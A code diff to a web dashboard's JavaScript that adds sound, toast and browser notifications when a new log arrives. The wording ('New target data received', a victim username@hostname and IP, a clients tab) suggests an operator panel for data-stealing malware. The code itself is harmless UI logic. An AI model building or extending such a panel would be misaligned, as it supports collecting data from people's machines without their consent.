@@ -266,22 +266,19 @@ function startAutoRefresh() {
 
 async function checkNewLogs(currentTotal) {
     if (lastTotalLogs !== null && currentTotal > lastTotalLogs) {
-        const soundEnabled = localStorage.getItem('sound_alerts_enabled') !== 'false';
-        if (soundEnabled) {
-            const audio = new Audio('/notify.mp3');
-            audio.play().catch(e => console.log('Audio playback blocked/failed:', e));
-        }
-
+        let logInfo = 'New target data received';
         try {
             const latestRes = await fetch('/api/logs?limit=1');
             const latestData = await latestRes.json();
             if (latestData.logs && latestData.logs.length > 0) {
                 const log = latestData.logs[0];
-                showToast('New log collected', `${log.username}@${log.hostname} — ${log.ip}`);
+                logInfo = `${log.username}@${log.hostname} — ${log.ip}`;
             }
-        } catch (e) {
-            showToast('New log collected', 'New target data received');
-        }
+        } catch (e) {}
+
+        showToast('New log collected', logInfo);
+        playNotificationSound();
+        sendBrowserNotification('New log collected', logInfo);
 
         const activeTab = document.querySelector('.nav-btn.active')?.getAttribute('data-tab');
         if (activeTab === 'clients') {
@@ -289,6 +286,38 @@ async function checkNewLogs(currentTotal) {
         }
     }
     lastTotalLogs = currentTotal;
+}
+
+function playNotificationSound() {
+    const soundEnabled = localStorage.getItem('sound_alerts_enabled') !== 'false';
+    if (!soundEnabled) return;
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.frequency.value = 880;
+        osc.type = 'sine';
+        gain.gain.setValueAtTime(0.3, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+        osc.start(ctx.currentTime);
+        osc.stop(ctx.currentTime + 0.5);
+    } catch (e) {
+        const audio = new Audio('/notify.mp3');
+        audio.play().catch(() => {});
+    }
+}
+
+function sendBrowserNotification(title, body) {
+    if (!('Notification' in window)) return;
+    if (Notification.permission === 'granted') {
+        new Notification(title, { body, icon: '/favicon.ico' });
+    } else if (Notification.permission !== 'denied') {
+        Notification.requestPermission().then(p => {
+            if (p === 'granted') new Notification(title, { body, icon: '/favicon.ico' });
+        });
+    }
 }
 
 async function loadClientsSilent() {
@@ -341,6 +370,10 @@ window.addEventListener('DOMContentLoaded', async () => {
     await loadSettings();
     await loadDashboardStats();
     startAutoRefresh();
+
+    if ('Notification' in window && Notification.permission === 'default') {
+        Notification.requestPermission();
+    }
 });
 
 function initAuthUI() {
